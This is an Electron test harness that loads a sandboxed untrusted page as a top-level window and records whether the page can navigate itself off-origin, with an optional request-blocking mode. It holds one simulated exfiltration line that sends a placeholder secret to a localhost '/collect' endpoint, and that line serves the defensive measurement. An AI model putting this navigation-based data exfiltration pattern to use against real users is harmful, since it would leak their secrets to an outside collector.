/**
 * WS0 SPIKE — top-level harness. Throwaway.
 *
 * Loads the untrusted page DIRECTLY as a top-level document (no wrapper, no
 * embedding frame). This is the "user opened the page in their own browser"
 * case, and it is the one that decides whether the capability split in §2.5 is
 * actually necessary.
 *
 * The framed run showed self-navigation blocked by ERR_BLOCKED_BY_CSP — but
 * that was the WRAPPER's frame-src governing where the child frame may go.
 * With no embedder there is no frame-src to apply, so the only candidate
 * control left is the sandbox itself: a top-level document sandboxed without
 * allow-top-navigation is arguably navigating "the top" when it navigates
 * itself. Whether engines enforce that is exactly what this measures.
 */
const { app, BrowserWindow, session } = require('electron')

const args = process.argv.slice(2)
const arg = (n, d) => { const h = args.find(a => a.startsWith(`--${n}=`)); return h ? h.split('=')[1] : d }
const PORT = arg('port', '8899')
const MODE = arg('mode', 'observe')
const PAGE_ORIGIN = `http://127.0.0.1:${PORT}`

const attempted = []
const blocked = []
const navigations = []
let done = false

function finish(reason) {
  if (done) return
  done = true
  console.log('\n===WS0_JSON_BEGIN===')
  console.log(JSON.stringify({
    harness: 'top-level',
    mode: MODE,
    finishReason: reason,
    navigationsObserved: navigations,
    offOriginRequestsAttempted: attempted.filter(u => !u.startsWith(PAGE_ORIGIN) && !u.startsWith('devtools://')),
    offOriginRequestsBlocked: blocked.filter(u => !u.startsWith(PAGE_ORIGIN)),
  }, null, 2))
  console.log('===WS0_JSON_END===')
  setTimeout(() => app.exit(0), 50)
}

app.on('ready', () => {
  const ses = session.fromPartition('persist:ws0-pages-top')
  ses.webRequest.onBeforeRequest((details, cb) => {
    attempted.push(details.url)
    if (MODE === 'deny') {
      const ok = details.url.startsWith(PAGE_ORIGIN) || details.url.startsWith('devtools://')
      if (!ok) { blocked.push(details.url); return cb({ cancel: true }) }
    }
    cb({ cancel: false })
  })

  const win = new BrowserWindow({
    show: false,
    webPreferences: { session: ses, nodeIntegration: false, contextIsolation: true, sandbox: true },
  })

  win.webContents.on('did-start-navigation', (_e, url, _ip, isMainFrame) => {
    navigations.push({ phase: 'start', url, isMainFrame })
  })
  win.webContents.on('did-fail-load', (_e, code, desc, url, isMainFrame) => {
    navigations.push({ phase: 'fail', url, code, desc, isMainFrame })
  })
  win.webContents.on('did-finish-load', () => {
    navigations.push({ phase: 'finish', url: win.webContents.getURL() })
  })

  // Load the untrusted page directly, then trigger self-navigation from inside
  // it. No wrapper is involved, so nothing can postMessage the command in —
  // executeJavaScript stands in for "the page's own script decided to do this".
  win.loadURL(`${PAGE_ORIGIN}/p/test-page/r/1/index.html`)

  win.webContents.once('did-finish-load', () => {
    setTimeout(() => {
      win.webContents
        .executeJavaScript(`location.href = 'http://127.0.0.1:9999/collect?d=SECRET_PAYLOAD'; 'dispatched'`)
        .then(r => navigations.push({ phase: 'selfnav-dispatched', result: r }))
        .catch(e => navigations.push({ phase: 'selfnav-threw', error: String(e) }))
      setTimeout(() => {
        navigations.push({ phase: 'final-url', url: win.webContents.getURL() })
        finish('done')
      }, 2500)
    }, 800)
  })

  setTimeout(() => finish('timeout'), 20000)
})
